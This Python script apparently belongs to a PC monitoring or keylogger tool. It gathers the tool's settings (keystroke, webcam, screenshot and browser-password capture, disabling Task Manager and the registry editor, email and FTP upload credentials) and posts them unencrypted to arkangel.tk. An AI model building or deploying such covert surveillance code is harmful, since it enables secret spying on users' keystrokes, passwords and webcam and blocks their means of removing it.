import sqlite3
import json
import requests
from getsqldata import *

uid = getCurrentUser()
token = getRowValue('current_user',uid)[1]

#9ồng bộ lên web

keywordAlert = getRowValue('AlertList',uid)

alertSettings = getRowValue('Alerts',uid)

emailSettings = getRowValue('Email',uid)

emailDeliverySettings = getRowValue('EmailDelivery',uid)

ftpSettings = getRowValue('FTP',uid)

ftpServerSettings = getRowValue('FTPServer',uid)

generalSettings = getRowValue('General',uid)

screenshotSettings = getRowValue('Screenshot',uid)

#target list
targetApp = getColumnValue('byApp','TargetList',uid)
targetTitle = getColumnValue('byName','TargetList',uid)

targetSettings = getRowValue('Targets',uid)

userSettings = getRowValue('Users',uid)

webcamSettings = getRowValue('Webcam',uid)

webusageSettings = getRowValue('webusage',uid)

monitorUserSettings = getRowValue('monitor_user',uid)


settings = {}

settings['token'] = token

webUsage = {}
webUsage['enable'] = webusageSettings[1]
webUsage['bookmark'] = webusageSettings[2]
webUsage['password'] = webusageSettings[3]
settings['web'] = webUsage

Users = {}
Users['username'] = userSettings[1]
settings['monitor_user'] = Users['username']


monitorUser = {}
if(monitorUserSettings[1] == 1):
    monitorUser['enableAll'] = 1  
    monitorUser['enableCurrent'] = 0
    monitorUser['enableFollowing'] = 0
if(monitorUserSettings[1] == 2):
    monitorUser['enableAll'] = 0  
    monitorUser['enableCurrent'] = 1
    monitorUser['enableFollowing'] = 0
if(monitorUserSettings[1] == 3):
    monitorUser['enableAll'] = 0 
    monitorUser['enableCurrent'] = 0
    monitorUser['enableFollowing'] = 1

settings['user'] = monitorUser

userList = getColumnValue('user','user_list',uid)
settings['keywordUser'] =   userList


#alert list
keywordAlertList = getColumnValue('key','AlertList',uid)

keywordAlert = {}
keywordAlert['name'] = "keywordAlert"
keywordAlert['user'] = Users['username']
keywordAlert['list'] = keywordAlertList
settings['keywordAlert'] = keywordAlert

#target list
keywordTargetList = {}
keywordTargetList['name'] = "keywordTarget"
keywordTargetList['user'] = Users['username']

keywordTargetList['application'] = targetApp
keywordTargetList['title'] = targetTitle
settings['keywordTarget'] = keywordTargetList

######################
alert = {}
alert['name'] = "alert"
alert['user'] = Users['username']
alert['enableEmail'] = alertSettings[1] == 1 and True or False
#print(alertSettings[2] == 1 and True or False)
alert['enableScreenshot'] = alertSettings[2] == 1 and True or False
settings['alert'] = alert

email = {}
email['name'] = "email"
email['user'] = Users['username']
email['enableClear'] = emailSettings[10] == 1 and True or False
email['enableEmail'] = emailSettings[1] == 1 and True or False
email['enableLimit'] = emailSettings[8] == 1 and True or False
email['enableUploadImage'] = emailSettings[5] == 1 and True or False
email['enableUploadKeystroke'] = emailSettings[4] == 1 and True or False
email['enableUploadWebcam'] = emailSettings[6] == 1 and True or False
email['enableUploadWebsite'] = emailSettings[7] == 1 and True or False
email['hoursEmail'] = emailSettings[2]
email['limitEmail'] = emailSettings[9]
email['minutesEmail'] = emailSettings[3]
email['passwordEmail'] = emailDeliverySettings[5]
email['passwordZipEmail'] = emailSettings[11]
email['portEmail'] = emailDeliverySettings[3]
email['smtpEmail'] = emailDeliverySettings[2]
email['subjectEmail'] = emailDeliverySettings[6]
email['userEmail'] = emailDeliverySettings[4]
email['enableZip'] = emailSettings[12] == 1 and True or False
email['sendTo'] = emailDeliverySettings[1]
settings['email'] = email

ftp = {}
ftp['name'] = "ftp"
ftp['user'] = Users['username']
ftp['enableClear'] = ftpSettings[10] == 1 and True or False
ftp['enableFTP'] = ftpSettings[1] == 1 and True or False
ftp['enablePassive'] = ftpServerSettings[5] == 1 and True or False
ftp['enableUploadImage'] = ftpSettings[5] == 1 and True or False
ftp['enableUploadKeystroke'] = ftpSettings[4] == 1 and True or False
ftp['enableUploadWebcam'] = ftpSettings[6] == 1 and True or False
ftp['enableUploadWebsite'] = ftpSettings[7] == 1 and True or False
ftp['hostnameFTP'] = ftpServerSettings[1]
ftp['hoursFTP'] = ftpSettings[2]
ftp['limitFTP'] = ftpSettings[9]
ftp['minutesFTP'] = ftpSettings[3]
ftp['passwordFTP'] = ftpServerSettings[3]
ftp['remoteDirFTP'] = ftpServerSettings[4]
ftp['userFTP'] = ftpServerSettings[2]
ftp['enableLimit'] = ftpSettings[8] == 1 and True or False
settings['ftp'] = ftp

general = {}
general['name'] = "general"
general['user'] = Users['username']
general['disableRegistry'] = generalSettings[2] == 1 and True or False
general['disableTaskManager'] = generalSettings[1] == 1 and True or False
general['enableEncrypt'] = generalSettings[3] == 1 and True or False
general['enableHotkey'] = generalSettings[5] == 1 and True or False
general['enableStartup'] = generalSettings[4] == 1 and True or False
general['hotkeyGeneral'] = generalSettings[6]
settings['general'] = general

screenshot = {}
screenshot['name'] = "screenshot"
screenshot['user'] = Users['username']
screenshot['deleteScreenshot'] = screenshotSettings[5]
screenshot['enableDelete'] = screenshotSettings[4] == 1 and True or False
screenshot['enableDouble'] = screenshotSettings[3] == 1 and True or False
screenshot['enableScreenshot'] = screenshotSettings[1] == 1 and True or False
screenshot['enableTimestamp'] = screenshotSettings[2] == 1 and True or False
screenshot['hoursScreenshot'] = screenshotSettings[6]
screenshot['minutesScreenshot'] = screenshotSettings[7]
screenshot['qualityScreenshot'] = screenshotSettings[8]
screenshot['dateDelete'] = screenshotSettings[9]
settings['screenshot'] = screenshot

target = {}
target['name'] = "target"
target['user'] = Users['username']
target['enableAll'] = targetSettings[1] == 1 and True or False
target['enableOnly'] = targetSettings[2] == 1 and True or False
settings['target'] = target

webcam = {}
webcam['name'] = "webcam"
webcam['user'] = Users['username']
webcam['enableWebcam'] = webcamSettings[1] == 1 and True or False
webcam['hoursWebcam'] = webcamSettings[2]
webcam['minutesWebcam'] = webcamSettings[3]
webcam['enableDelete'] = webcamSettings[4] == 1 and True or False
webcam['daysWebcam'] = webcamSettings[5]
webcam['enableDeleteUpload'] = webcamSettings[7] == 1 and True or False
webcam['dateDelete'] = webcamSettings[6]
settings['webcam'] = webcam


url = "http://www.arkangel.tk/sync-settings-up"
headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
r = requests.post(url, data=json.dumps(settings), headers=headers)

